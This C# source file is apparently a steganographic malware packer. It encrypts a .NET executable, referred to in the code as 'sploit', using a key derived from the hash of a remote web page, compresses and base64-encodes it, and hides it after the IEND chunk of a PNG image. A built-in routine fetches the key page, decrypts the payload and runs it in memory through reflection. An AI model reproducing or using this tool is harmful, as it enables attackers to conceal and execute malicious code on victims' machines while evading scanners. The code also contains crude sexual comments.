/*
Its complicated but then again... what isn't?
*/

using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net;
using System.Linq;
using System.Reflection;
using System.IO.Compression;
using System.Security;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace ConsoleLauncher
{
    class Enc
    {
        public static byte[] aes_encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes, byte[] iv)
        {
            byte[] encryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    AES.Padding = PaddingMode.ANSIX923;
                    AES.Key = passwordBytes;
                    AES.IV = iv;
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.FlushFinalBlock();
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        public static byte[] aes_decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes, byte[] iv)
        {
            byte[] decryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    AES.Padding = PaddingMode.ANSIX923;
                    AES.Key = passwordBytes;
                    AES.IV = iv;
                    AES.Mode = CipherMode.CBC;
                    try
                    {
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.FlushFinalBlock();
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.WriteLine("Error in decryption process");
                        Environment.Exit(1);
                    }
                }
            }
            return decryptedBytes;
        }

        // add custom padding
        public static byte[] padit(byte[] input)
        {
            int length = 0;
            if (input.Length < 128) // small files issue
            {
                length = 128 - input.Length;
            }
            else
            {
                length = (16 - (input.Length % 16));
            }
            byte[] ret = new byte[input.Length + length];
            for (int i = 0; i < length; i++)
            {
                ret[i] = 0x11;
                if (i == length - 1)
                {
                    ret[i] = 0xff;
                }
            }
            input.CopyTo(ret, length);
            return ret;
        }

        // remove custom padding
        public static byte[] depadit(byte[] input)
        {
            int length = 0;
            for (int i = 0; i < input.Length; i++)
            {
                if (i < 16 || input.Length == 128) // small files issue
                {
                    if (input[i] == 0x11)
                    {
                        length++;
                        if (input[i + 1] == 0xff)
                        {
                            length++;
                            break;
                        }
                    }
                }
            }
            byte[] ret = new byte[input.Length - length];
            Array.Copy(input, length, ret, 0, input.Length - length);
            return ret;
        }

        public static byte[] gen_random_bytes(int _saltSize)
        {
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }

        public static byte[] encrypt_small_pass(String pass, byte[] data, byte[] salt)
        {
            var key = new Rfc2898DeriveBytes(pass, salt, 7195);

            byte[] out_data = Enc.aes_encrypt(data, key.GetBytes(16), salt);
            return out_data;
        }

        public static byte[] decrypt_small_pass(String pass, byte[] data, byte[] salt)
        {
            var key = new Rfc2898DeriveBytes(pass, salt, 7195);

            byte[] out_data = Enc.aes_decrypt(data, key.GetBytes(16), salt);
            return out_data;
        }

        class Program
        {
            // debug_print("This is how to debug byte[] {0}", byte_array)
            // debug_print("This is how to debug string {0}", ourstring)
            public static bool debug_it = false;

            public static void debug_print(string msg = null, byte[] bte = null, string txt2 = null)
            { if (debug_it == true) { Console.WriteLine(msg, BitConverter.ToString(bte), txt2); } }

            public static void debug_print(string msg = null, string txt = null, string txt2 = null)
            { if (debug_it == true) { Console.WriteLine(msg, txt, txt2); } }

            // test file true/false
            public static bool test_file(String file) { if (File.Exists(file)) { return true; } else { return false; } }

            static byte[] hash_page(byte[] url_data, int offset)
            {
                SHA512Managed make_hash = new SHA512Managed();
                Byte[] hash = make_hash.ComputeHash(url_data, offset, url_data.Length - offset);
                return hash;
            }

            public static string base64_encode(byte[] data)
            {
                if (data == null)
                    throw new ArgumentNullException("data");
                return Convert.ToBase64String(data);
            }

            public static byte[] base64_decode(byte[] encodedData)
            {
                string s = System.Text.Encoding.UTF8.GetString(encodedData, 0, encodedData.Length);
                byte[] encodedDataAsBytes = Convert.FromBase64String(s);
                return encodedDataAsBytes;
            }

            public static byte[] compress_bin(byte[] data)
            {
                using (var compressedStream = new MemoryStream())
                using (var zipStream = new GZipStream(compressedStream, CompressionMode.Compress))
                {
                    zipStream.Write(data, 0, data.Length);
                    zipStream.Close();
                    return compressedStream.ToArray();
                }
            }

            public static byte[] decompress_bin(byte[] data)
            {
                using (var compressedStream = new MemoryStream(data))
                using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                using (var resultStream = new MemoryStream())
                {
                    var buffer = new byte[4096];
                    int read;
                    while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        resultStream.Write(buffer, 0, read);
                    }
                    return resultStream.ToArray();
                }
            }

            // xor encrypted data with the page.. "not implemented"
            public static byte[] enc_xor(byte[] key, byte[] data)
            {
                if (key.Length == data.Length)
                {
                    byte[] result = new byte[key.Length];
                    for (int i = 0; i < key.Length; i++)
                    {
                        result[i] = (byte)(key[i] ^ data[i]);
                    }
                    return result;
                }
                else
                {
                    throw new ArgumentException();
                }
            }

            //why cant you regex a byte array??..  \x49\x45\x4e\x44 = IEND.. ya! <--patient
            public static int do_png(Byte[] file_bytes)
            {
                int position = 0;
                for (int i = 0; i < file_bytes.Length; i++)
                {
                    if (file_bytes[i] == 0x49)
                    {
                        if (file_bytes[i + 1] == 0x45)
                        {
                            if (file_bytes[i + 2] == 0x4e)
                            {
                                if (file_bytes[i + 3] == 0x44)
                                {
                                    position = (i + 4) + 4;
                                    debug_print("The position of IEND {0}", position.ToString());
                                }
                            }
                        }
                    }
                }
                return position;
            }

            public static byte[] get_page(string url)
            {
                try
                {
                    HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                    IWebProxy webProxy = myWebRequest.Proxy;
                    if (webProxy != null)
                    {
                        webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                        myWebRequest.Proxy = webProxy;
                    }
                    var buffer = new byte[4096];
                    HttpWebResponse httpResponse = (HttpWebResponse)myWebRequest.GetResponse();
                    using (var ms = new MemoryStream())
                    {
                        using (var reader = new BinaryReader(httpResponse.GetResponseStream()))
                        {
                            int bytesRead;
                            while ((bytesRead = reader.Read(buffer, 0, 4096)) > 0)
                            {
                                ms.Write(buffer, 0, bytesRead);
                            }
                        }
                        return ms.ToArray();
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine("there was a issue with the url...");
                    Environment.Exit(1);
                    return null;
                }
            }

            // test our final image to veryify its working!
            public static void test_everything(string output_file, string enc_pass, int offset, byte[] b64_test, string[] main_args, int code_position )
            {
                Byte[] salt = { 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2 };
                Console.WriteLine("We are debugging it to make sure everything works properly!");
                Byte[] enc_testdata = File.ReadAllBytes(output_file);

                //int pos = do_png(enc_testdata);
                //pos = pos + 37; // header length is 37
                int pos = code_position;

                Byte[] b64_data_only = new Byte[enc_testdata.Length - pos];
                Buffer.BlockCopy(enc_testdata, pos, b64_data_only, 0, enc_testdata.Length - pos);

                debug_print("TESTING, base64 data {0}", b64_data_only);

                Byte[] comp_data = base64_decode(b64_data_only);
                Byte[] enc_data = decompress_bin(comp_data);

                // the length of the url, stored as Int16
                int nn = enc_data[0] + (enc_data[1] << 8);
                Byte[] enc_pre_pass = new Byte[nn];
                Array.Copy(enc_data, 2, enc_pre_pass, 0, enc_pre_pass.Length);
                
                Byte[] decrypted_url_pass = Enc.decrypt_small_pass(enc_pass, enc_pre_pass, salt);
                Byte[] url_pass = Enc.depadit(decrypted_url_pass);

                // the offset is our enc data minus the url
                int enc_data_offset = enc_pre_pass.Length + 2; 
                
                String nurl = Encoding.UTF8.GetString(url_pass);
                // get file or webpage for encryption
                Byte[] enc_page;
                if (test_file(nurl)) { enc_page = File.ReadAllBytes(nurl); } else { enc_page = get_page(nurl); }

                Byte[] master_pass = hash_page(enc_page, offset);
                debug_print("Our testing master_pass {0}", master_pass);

                // I HATE doing it like this but meh...
                Byte[] pass = new Byte[0x20];
                Byte[] pass_4 = new Byte[0x10];
                Array.Copy(master_pass, master_pass.Length / 4, pass, 0, master_pass.Length / 2);
                Array.Copy(master_pass, master_pass.Length / 8, pass_4, 0, master_pass.Length / 4);
                debug_print("Password Is: {0}", pass);
                debug_print("The IV Is: {0}", pass_4);

                Byte[] enc_sploit_data = new Byte[enc_data.Length - enc_data_offset]; // get ready for the money shot
                Array.Copy(enc_data, enc_data_offset, enc_sploit_data, 0, enc_sploit_data.Length);
                Byte[] decrypted_sploit_bytes = Enc.aes_decrypt(enc_sploit_data, pass, pass_4);

                debug_print("Our encrypted file is: {0}", decrypted_sploit_bytes);

                Console.WriteLine("Everything should have worked, loading the binary.");
                // load the bytes into Assembly
                Assembly a = Assembly.Load(decrypted_sploit_bytes);

                // search for the Entry Point
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    // GlobalAssemblyCache <-- ????
                    // create an istance of the Startup form Main method
                    Object o = a.CreateInstance(method.Name);

                    // copy main_args into new array, to use in object
                    String[] prog_args = new String[main_args.Length - 1]; // adjust this if we use more args!
                    Array.Copy(main_args, 1, prog_args, 0, main_args.Length - 1);
                    try
                    {
                        // invoke the application starting point
                        method.Invoke(o, new Object[] { prog_args }); // all over her face
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
              
            }

            // lololol
            public static string marshal_my_file(byte[] sploit_data, String url_pass, String enc_pass, int offset)
            {
                Byte[] salt = { 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2 };
                debug_print("The orignal sploit data: {0}", sploit_data);
                Byte[] url_pass_data;
                if (test_file(url_pass))
                {
                    url_pass_data = File.ReadAllBytes(url_pass);
                }
                else
                {
                    url_pass_data = get_page(url_pass);
                }

                Byte[] bytesToBeEncrypted = new Byte[offset + sploit_data.Length];
                if (offset != 0)
                {
                    if (offset > url_pass_data.Length)
                    {
                        Console.WriteLine("Sorry your page is only {0} bytes long", url_pass_data.Length);
                        Environment.Exit(0);
                    }
                    // we also use the offset to add that many random bytes to the beginning..
                    Byte[] saltBytes = Enc.gen_random_bytes(offset);
                    for (int i = 0; i < saltBytes.Length; i++)
                    {
                        bytesToBeEncrypted[i] = saltBytes[i];
                    }
                }

                for (int i = 0; i < sploit_data.Length; i++)
                {
                    bytesToBeEncrypted[i + offset] = sploit_data[i];
                }
                // end offset stuff

                // encrypt the url now, as we need that.
                Byte[] url_pass_inbytes = Encoding.UTF8.GetBytes(url_pass);
                debug_print("The url_pass_inbytes: {0}", url_pass_inbytes);
                Byte[] url_pass_padded = Enc.padit(url_pass_inbytes);
                debug_print("The url_pass_padded: {0}", url_pass_padded);
                debug_print("The salt we are using {0}", salt);
                Byte[] encrypted_url_pass = Enc.encrypt_small_pass(enc_pass, url_pass_padded, salt);
                debug_print("The encrypted_url_pass: {0}", encrypted_url_pass);
                Byte[] master_password = hash_page(url_pass_data, offset);
                debug_print("The master_password/hash from url page {0}", master_password);

                // I HATE doing it like this but meh...
                Byte[] pass = new byte[0x20];
                Byte[] pass_4 = new byte[0x10];
                Array.Copy(master_password, master_password.Length / 4, pass, 0, master_password.Length / 2);
                Array.Copy(master_password, master_password.Length / 8, pass_4, 0, master_password.Length / 4);
                debug_print("Password Is: {0}", pass);
                debug_print("The IV Is: {0}", pass_4);

                Byte[] encrypted_sploit_bytes = Enc.aes_encrypt(sploit_data, pass, pass_4);
                debug_print("Our encrypted file is: {0}", encrypted_sploit_bytes);

                // we COULD xor it here, but im not going to bother

                // we need to append the encrypted_url_pass, to our encrypted_sploit_bytes..
                // we could also come up with a nifty method here, for now its already to complicated and my head hurts....
                Byte[] all_encrypted = new Byte[encrypted_url_pass.Length + encrypted_sploit_bytes.Length + 2]; // 2 bytes for length

                // c++ lol incase its longer than 255, we need 2 bytes
                all_encrypted[0] = (Byte)(encrypted_url_pass.Length & 255);
                all_encrypted[1] = (Byte)(encrypted_url_pass.Length >> 8);
                // int url_length = all_encrypted[0] + (all_encrypted[1] << 8); // the reverse!

                Array.Copy(encrypted_url_pass, 0, all_encrypted, 2, encrypted_url_pass.Length); // start at 2
                Array.Copy(encrypted_sploit_bytes, 0, all_encrypted, encrypted_url_pass.Length + 2, encrypted_sploit_bytes.Length);

                debug_print("The size of all_encrypted {0}", all_encrypted.Length.ToString());
                debug_print("The url encrypted pass and data: {0}", all_encrypted);

                // assuming everything went well lets compress it
                Byte[] compressed_sploit = compress_bin(all_encrypted);
                debug_print("Our compressed file: {0}", compressed_sploit);

                String b64_sploit = base64_encode(compressed_sploit);
                debug_print("Our base64 file: {0}", b64_sploit);

                return b64_sploit;
            }

            public static void Main(string[] args)
            {
                if (args.Length < 6)
                {
                    Console.WriteLine("Usage: encoder.exe picture.png net_binary.exe <pass> <urlpass/filepass> <offset> output.png <debug> <debug>");
                    Environment.Exit(1);
                }
                String main_pic = args[0];
                String exp_file = args[1];
                String enc_pass = args[2];
                String url_pass = args[3];
                int offset = Int32.Parse(args[4]);
                String out_file = args[5];
                bool run_debug = false;
                if (args.Length >= 7) { if (args[6].ToLower() == "debug") { run_debug=true; } }
                if (args.Length >= 8) { if (args[7].ToLower() == "debug") { debug_it = true; } }
                // get the position we can write to in our png
                Byte[] pic_bytes = File.ReadAllBytes(main_pic);
                int real_len = pic_bytes.Length;
                debug_print("The actual length of the picture is {0}", real_len.ToString());
                int pos = do_png(pic_bytes);

                // get bytes from exe
                Byte[] sploit_bytes = File.ReadAllBytes(exp_file);

                // do all the encryption stuff
                String b64_sploit = marshal_my_file(sploit_bytes, url_pass, enc_pass, offset);

                Byte[] b64_bytes = Encoding.UTF8.GetBytes(b64_sploit);
                Byte[] header_bytes = Encoding.UTF8.GetBytes("data:application/x-msdownload;base64,"); // the header length 37
                BinaryWriter Writer = new BinaryWriter(File.OpenWrite(out_file));
                Writer.Write(pic_bytes, 0, pos);
                Writer.Write(header_bytes);
                Writer.Write(b64_bytes);
                Writer.Flush();
                Writer.Close();
                int code_position = pos + header_bytes.Length;
                Console.WriteLine("Your data is located at position: {0}", code_position.ToString());
                if (run_debug) { test_everything(out_file, enc_pass, offset, b64_bytes, args, code_position); }
            }
        }
    }
}
